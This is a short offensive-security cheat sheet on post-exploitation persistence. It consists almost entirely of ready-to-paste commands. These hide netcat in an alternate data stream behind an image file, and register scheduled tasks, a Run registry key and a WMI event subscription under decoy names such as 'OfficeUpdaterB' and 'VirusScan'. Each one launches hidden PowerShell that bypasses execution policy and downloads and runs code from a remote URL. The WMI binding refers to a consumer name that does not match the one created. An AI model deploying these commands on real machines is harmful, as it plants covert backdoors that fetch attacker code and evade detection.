---
title: Persistance
category: Post-Exploitation
order: 101
---

>**Linux**

<code>setsid *command*</code>

>**Windows**

ADS and Scheduled Task (user level) |  <code> type c:\tools\nc.exe > c:\nice.png:nc.exe  </code>
ADS and Scheduled Task (user level) |  <code> start c:\nice.png:nc.exe  </code>
ADS and Scheduled Task (user level) |  <code> start c:\nice.png:nc.exe  </code>
Schduled Task | <code> schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''[]'''))'" /sc onstart /ru System </code>
Scheduled Task | <code> schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://website/page'''))'" /sc daily /st 12:53 </code>
Run Key | <code> REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "OfficeUpdaterB" /t REG_SZ /F /D "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c \"IEX ((new-object net.webclient).downloadstring('https://website/page'))\"" </code>



WMI Persistence:
<code> 
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="VirusScan", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'" 
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="VirusScan", CommandLineTemplate="powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('https://URL.com/file'))\""
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"VirusScan\"", Consumer="CommandLineEventConsumer.Name=\"PushVirusScan\""
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list
</code>

* http://pwnwiki.io/#!persistence/windows/index.md
